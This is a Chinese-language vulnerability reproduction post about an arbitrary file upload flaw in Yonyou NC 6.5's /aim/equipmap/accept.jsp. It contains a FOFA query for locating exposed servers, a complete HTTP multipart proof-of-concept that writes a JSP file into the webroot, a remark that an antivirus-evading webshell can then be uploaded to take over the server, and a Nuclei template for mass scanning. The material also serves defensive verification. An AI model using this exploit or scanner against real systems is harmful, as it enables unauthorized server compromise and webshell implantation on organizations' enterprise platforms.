# 原创
：  漏洞复现--用友NC accept.jsp任意文件上传

# 漏洞复现--用友NC accept.jsp任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC accept.jsp处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。

### 二：漏洞影响版本

用友NC-6.5

### 三：网络空间测绘查询

fofa:<br/> `icon_hash="1085941792"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0720f016375df96bb2c00c2ab8f99faf.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a74f4f5f3101f9ec84cc6582286b1450.jpeg"/><br/> POC：

```
POST /aim/equipmap/accept.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Connection: close
Content-Length: 449
Accept: */*
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc

-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="upload"; filename="test.txt"
Content-Type: text/plain

&lt;% out.println("hello vul"); %&gt;
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
Content-Disposition: form-data; name="fname"

\webapps\nc_web\test.jsp
-----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc--

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c8473d5822a5cbb3f8c600cd4118727d.jpeg"/><br/> 访问/test.jsp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/4c69140f2e0c5fcac1f200327b16d45f.jpeg"/><br/> 上传成功，并且成功解析，可上传免杀马获得服务器权限

### 五：批量检测

```
id: yonyou-nc-accept-fileupload

info:
  name: 用友NC accept.jsp任意文件上传漏洞
  author: fgz
  severity: critical
  description: |
    用友NC是大型企业管理与电子商务平台，帮助企业实现管理转型升级全面从以产品为中心转向以客户为中心（C2B）；从流程驱动转向数据驱动（DDE）；从延时运行转为实时运行（RTE）；从领导指挥到员工创新（E2M）。用友NC accept.jsp处存在任意文件上传漏洞，攻击者通过漏洞可以获取网站权限，导致服务器失陷。
  reference:
    none
  metadata:
    verified: true
    max-request: 2
    fofa-query: icon_hash="1085941792"
  tags: yonyou,nc,fileupload,2023

variables:
  boundary: '{{rand_base(29)}}'

http:
  - raw:
      - |
        POST /aim/equipmap/accept.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: multipart/form-data; boundary=---------------------------{{boundary}}
        Accept-Encoding: gzip

        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.txt"
        Content-Type: text/plain

        &lt;% out.println("{{randstr_2}}"); %&gt;
        -----------------------------{{boundary}}
        Content-Disposition: form-data; name="fname"

        \webapps\nc_web\{{randstr_3}}.jsp
        -----------------------------{{boundary}}--
      - |
        GET /{{randstr_3}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200 &amp;&amp; contains(body_2,'{{randstr_2}}')"
        condition: and

```
